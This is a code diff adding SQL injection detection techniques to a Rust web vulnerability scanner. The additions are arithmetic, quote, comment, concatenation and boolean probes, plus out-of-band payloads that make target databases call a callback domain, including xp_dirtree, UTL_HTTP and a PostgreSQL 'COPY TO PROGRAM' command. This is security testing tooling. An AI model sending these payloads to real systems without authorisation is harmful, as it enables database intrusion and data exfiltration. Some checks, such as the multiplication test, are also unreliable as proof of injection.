@@ -252,6 +252,22 @@ impl EnhancedSqliScanner {
             return Ok((all_vulnerabilities, total_tests));
         }
 
+        // ============================================================
+        // TECHNIQUE 0: ARITHMETIC/BEHAVIORAL INJECTION (INSANE MODE)
+        // Runs FIRST - catches SQLi that error-based misses
+        // No error messages needed, just behavioral differences
+        // ============================================================
+        let (arithmetic_vulns, arithmetic_tests) = self
+            .scan_arithmetic_injection(base_url, parameter, &baseline, config)
+            .await?;
+        total_tests += arithmetic_tests;
+        all_vulnerabilities.extend(arithmetic_vulns);
+
+        // If arithmetic found something, high confidence - can skip others in fast mode
+        if config.scan_mode.as_str() == "fast" && !all_vulnerabilities.is_empty() {
+            return Ok((all_vulnerabilities, total_tests));
+        }
+
         // Technique 1: Error-based detection (fast, high confidence)
         let (error_vulns, error_tests) = self
             .scan_error_based(
@@ -2845,6 +2861,322 @@ impl EnhancedSqliScanner {
                     urlencoding::encode(payload)
                 )
             }
+        }
+    }
+
+    /// INSANE MODE: Arithmetic injection detection
+    /// Catches SQLi that error-based and time-based miss
+    /// Works by detecting if the database evaluates mathematical expressions
+    async fn scan_arithmetic_injection(
+        &self,
+        base_url: &str,
+        parameter: &str,
+        baseline: &HttpResponse,
+        config: &ScanConfig,
+    ) -> Result<(Vec<Vulnerability>, usize)> {
+        let mut vulnerabilities = Vec::new();
+        let mut tests_run = 0;
+
+        // Extract current parameter value
+        let current_value = self.extract_param_value(base_url, parameter)
+            .unwrap_or_else(|| "1".to_string());
+
+        // Try to parse as number for arithmetic tests
+        let is_numeric = current_value.parse::<i64>().is_ok();
+        let num_value: i64 = current_value.parse().unwrap_or(1);
+
+        // Response similarity threshold
+        let similarity_threshold = 0.85;
+
+        // ============================================================
+        // TEST 1: Arithmetic operations (numeric parameters)
+        // If id=7-1 returns same as id=6, SQL is evaluating math
+        // ============================================================
+        if is_numeric && num_value > 1 {
+            // Get response for value-1
+            let minus_one_url = Self::build_test_url(base_url, parameter, &(num_value - 1).to_string());
+            let minus_one_resp = self.http_client.get(&minus_one_url).await.ok();
+            tests_run += 1;
+
+            // Test: (value+1)-1 should equal value if SQL evaluates math
+            let arithmetic_payload = format!("{}-1+1", num_value);
+            let arithmetic_url = Self::build_test_url(base_url, parameter, &arithmetic_payload);
+            if let Ok(arithmetic_resp) = self.http_client.get(&arithmetic_url).await {
+                tests_run += 1;
+
+                let baseline_similarity = self.calculate_similarity(baseline, &arithmetic_resp);
+                let minus_one_similarity = minus_one_resp.as_ref()
+                    .map(|r| self.calculate_similarity(r, &arithmetic_resp))
+                    .unwrap_or(0.0);
+
+                // If arithmetic result matches baseline (not value-1), SQLi confirmed
+                if baseline_similarity > similarity_threshold && minus_one_similarity < 0.7 {
+                    info!("[SQLi] ARITHMETIC INJECTION CONFIRMED: {}-1+1 = {} (math evaluated)", num_value, num_value);
+                    vulnerabilities.push(self.create_vulnerability(
+                        base_url,
+                        parameter,
+                        &arithmetic_payload,
+                        "Arithmetic SQL Injection",
+                        "Database evaluates mathematical expressions in parameter",
+                        Severity::High,
+                        Confidence::High,
+                    ));
+                    return Ok((vulnerabilities, tests_run));
+                }
+            }
+
+            // Test: value*1 should equal value
+            let mult_payload = format!("{}*1", num_value);
+            let mult_url = Self::build_test_url(base_url, parameter, &mult_payload);
+            if let Ok(mult_resp) = self.http_client.get(&mult_url).await {
+                tests_run += 1;
+
+                if self.calculate_similarity(baseline, &mult_resp) > similarity_threshold {
+                    info!("[SQLi] MULTIPLICATION INJECTION CONFIRMED: {}*1 = {}", num_value, num_value);
+                    vulnerabilities.push(self.create_vulnerability(
+                        base_url,
+                        parameter,
+                        &mult_payload,
+                        "Arithmetic SQL Injection",
+                        "Database evaluates multiplication in parameter",
+                        Severity::High,
+                        Confidence::High,
+                    ));
+                    return Ok((vulnerabilities, tests_run));
+                }
+            }
+        }
+
+        // ============================================================
+        // TEST 2: Quote cancellation
+        // If value'' returns same as value, quotes are being parsed
+        // ============================================================
+        let quote_cancel_payload = format!("{}''", current_value);
+        let quote_cancel_url = Self::build_test_url(base_url, parameter, &quote_cancel_payload);
+        if let Ok(quote_resp) = self.http_client.get(&quote_cancel_url).await {
+            tests_run += 1;
+
+            if self.calculate_similarity(baseline, &quote_resp) > similarity_threshold {
+                info!("[SQLi] QUOTE CANCELLATION CONFIRMED: {}'' = {} (SQL parsing quotes)", current_value, current_value);
+                vulnerabilities.push(self.create_vulnerability(
+                    base_url,
+                    parameter,
+                    &quote_cancel_payload,
+                    "Quote Cancellation SQL Injection",
+                    "Double quotes cancel out, indicating SQL string context",
+                    Severity::High,
+                    Confidence::High,
+                ));
+                return Ok((vulnerabilities, tests_run));
+            }
+        }
+
+        // ============================================================
+        // TEST 3: Comment injection
+        // If value'-- returns same as value, comment worked
+        // ============================================================
+        for (comment, db_hint) in [("'--", "Generic/MSSQL"), ("'#", "MySQL"), ("'-- -", "MySQL/MariaDB")] {
+            let comment_payload = format!("{}{}", current_value, comment);
+            let comment_url = Self::build_test_url(base_url, parameter, &comment_payload);
+            if let Ok(comment_resp) = self.http_client.get(&comment_url).await {
+                tests_run += 1;
+
+                if self.calculate_similarity(baseline, &comment_resp) > similarity_threshold {
+                    info!("[SQLi] COMMENT INJECTION CONFIRMED: {}{} works ({})", current_value, comment, db_hint);
+                    vulnerabilities.push(self.create_vulnerability(
+                        base_url,
+                        parameter,
+                        &comment_payload,
+                        "Comment Injection SQL Injection",
+                        &format!("SQL comment {} terminates query successfully", comment),
+                        Severity::High,
+                        Confidence::High,
+                    ));
+                    return Ok((vulnerabilities, tests_run));
+                }
+            }
+        }
+
+        // ============================================================
+        // TEST 4: String concatenation (database-specific)
+        // If 'adm'||'in' returns same as 'admin', concat works
+        // ============================================================
+        if current_value.len() >= 2 {
+            let mid = current_value.len() / 2;
+            let first_half = &current_value[..mid];
+            let second_half = &current_value[mid..];
+
+            // Oracle/PostgreSQL: ||
+            let concat_oracle = format!("{}'{}'||'{}", first_half, "'", second_half);
+            // MSSQL: +
+            let concat_mssql = format!("{}'+'{}",first_half, second_half);
+            // MySQL: CONCAT or space
+            let concat_mysql = format!("{}' '{}", first_half, second_half);
+
+            for (payload, db_type) in [(concat_oracle, "Oracle/PostgreSQL"), (concat_mssql, "MSSQL"), (concat_mysql, "MySQL")] {
+                let concat_url = Self::build_test_url(base_url, parameter, &payload);
+                if let Ok(concat_resp) = self.http_client.get(&concat_url).await {
+                    tests_run += 1;
+
+                    if self.calculate_similarity(baseline, &concat_resp) > similarity_threshold {
+                        info!("[SQLi] STRING CONCATENATION CONFIRMED: {} concat works ({})", payload, db_type);
+                        vulnerabilities.push(self.create_vulnerability(
+                            base_url,
+                            parameter,
+                            &payload,
+                            "String Concatenation SQL Injection",
+                            &format!("{} string concatenation successful", db_type),
+                            Severity::High,
+                            Confidence::High,
+                        ));
+                        return Ok((vulnerabilities, tests_run));
+                    }
+                }
+            }
+        }
+
+        // ============================================================
+        // TEST 5: Boolean differential
+        // If 'AND 1=1' differs from 'AND 1=2', boolean injection works
+        // ============================================================
+        let true_payload = format!("{} AND 1=1", current_value);
+        let false_payload = format!("{} AND 1=2", current_value);
+
+        let true_url = Self::build_test_url(base_url, parameter, &true_payload);
+        let false_url = Self::build_test_url(base_url, parameter, &false_payload);
+
+        if let (Ok(true_resp), Ok(false_resp)) = (
+            self.http_client.get(&true_url).await,
+            self.http_client.get(&false_url).await,
+        ) {
+            tests_run += 2;
+
+            let true_baseline_sim = self.calculate_similarity(baseline, &true_resp);
+            let false_baseline_sim = self.calculate_similarity(baseline, &false_resp);
+            let true_false_sim = self.calculate_similarity(&true_resp, &false_resp);
+
+            // True should match baseline, False should differ, and they should differ from each other
+            if true_baseline_sim > similarity_threshold
+                && false_baseline_sim < 0.7
+                && true_false_sim < 0.7
+            {
+                info!("[SQLi] BOOLEAN DIFFERENTIAL CONFIRMED: AND 1=1 ≠ AND 1=2");
+                vulnerabilities.push(self.create_vulnerability(
+                    base_url,
+                    parameter,
+                    &true_payload,
+                    "Boolean-based SQL Injection",
+                    "AND 1=1 and AND 1=2 produce different responses",
+                    Severity::High,
+                    Confidence::High,
+                ));
+                return Ok((vulnerabilities, tests_run));
+            }
+        }
+
+        Ok((vulnerabilities, tests_run))
+    }
+
+    /// OUT-OF-BAND SQL Injection detection
+    /// Uses DNS/HTTP callbacks to detect blind SQLi
+    async fn scan_oob_injection(
+        &self,
+        base_url: &str,
+        parameter: &str,
+        oob_domain: Option<&str>,
+        _config: &ScanConfig,
+    ) -> Result<(Vec<Vulnerability>, usize)> {
+        let mut vulnerabilities = Vec::new();
+        let mut tests_run = 0;
+
+        // If no OOB domain configured, skip
+        let callback_domain = match oob_domain {
+            Some(d) => d,
+            None => return Ok((vulnerabilities, tests_run)),
+        };
+
+        // Generate unique token for this test
+        let token = uuid::Uuid::new_v4().to_string().replace("-", "")[..12].to_string();
+        let callback_url = format!("{}.{}", token, callback_domain);
+
+        // OOB payloads for different databases
+        let oob_payloads = vec![
+            // MySQL - DNS exfiltration via LOAD_FILE
+            (format!("' AND LOAD_FILE('\\\\\\\\{}\\\\a')-- ", callback_url), "MySQL LOAD_FILE"),
+            // MySQL - DNS via SELECT INTO OUTFILE
+            (format!("' UNION SELECT 1 INTO OUTFILE '\\\\\\\\{}\\\\a'-- ", callback_url), "MySQL OUTFILE"),
+            // MSSQL - xp_dirtree for DNS
+            (format!("'; EXEC master..xp_dirtree '\\\\{}\\a'-- ", callback_url), "MSSQL xp_dirtree"),
+            // MSSQL - xp_fileexist
+            (format!("'; EXEC master..xp_fileexist '\\\\{}\\a'-- ", callback_url), "MSSQL xp_fileexist"),
+            // PostgreSQL - COPY for DNS
+            (format!("'; COPY (SELECT '') TO PROGRAM 'nslookup {}'-- ", callback_url), "PostgreSQL COPY"),
+            // Oracle - UTL_HTTP
+            (format!("' AND UTL_HTTP.REQUEST('http://{}/')=1-- ", callback_url), "Oracle UTL_HTTP"),
+            // Oracle - UTL_INADDR
+            (format!("' AND UTL_INADDR.GET_HOST_ADDRESS('{}')=1-- ", callback_url), "Oracle UTL_INADDR"),
+        ];
+
+        for (payload, technique) in oob_payloads {
+            let test_url = Self::build_test_url(base_url, parameter, &payload);
+
+            // Send the payload (we don't care about the response)
+            let _ = self.http_client.get(&test_url).await;
+            tests_run += 1;
+
+            debug!("[SQLi-OOB] Sent {} payload, callback token: {}", technique, token);
+        }
+
+        // Note: In a real implementation, we would:
+        // 1. Wait a few seconds
+        // 2. Query our callback server for the token
+        // 3. If token was received, SQLi is confirmed
+        //
+        // For now, we just inject the payloads. The callback server
+        // would need to be polled separately.
+
+        info!("[SQLi-OOB] Injected {} OOB payloads with token: {}", tests_run, token);
+        info!("[SQLi-OOB] Check callback server for hits on: {}", callback_url);
+
+        Ok((vulnerabilities, tests_run))
+    }
+
+    /// Create a vulnerability report
+    fn create_vulnerability(
+        &self,
+        url: &str,
+        parameter: &str,
+        payload: &str,
+        vuln_type: &str,
+        description: &str,
+        severity: Severity,
+        confidence: Confidence,
+    ) -> Vulnerability {
+        let cvss_score = match severity {
+            Severity::Critical => 9.8,
+            Severity::High => 8.6,
+            Severity::Medium => 6.5,
+            Severity::Low => 3.5,
+            Severity::Info => 0.0,
+        };
+        Vulnerability {
+            id: format!("sqli_{}_{}", vuln_type.to_lowercase().replace(" ", "_"), Self::generate_id()),
+            vuln_type: vuln_type.to_string(),
+            severity,
+            confidence,
+            category: "SQL Injection".to_string(),
+            url: url.to_string(),
+            parameter: Some(parameter.to_string()),
+            payload: payload.to_string(),
+            description: format!("{}: {} in parameter '{}'", vuln_type, description, parameter),
+            evidence: Some(description.to_string()),
+            cwe: "CWE-89".to_string(),
+            cvss: cvss_score,
+            verified: true,
+            false_positive: false,
+            remediation: "Use parameterized queries or prepared statements. Never concatenate user input into SQL queries.".to_string(),
+            discovered_at: chrono::Utc::now().to_rfc3339(),
+            ml_data: None,
         }
     }
 
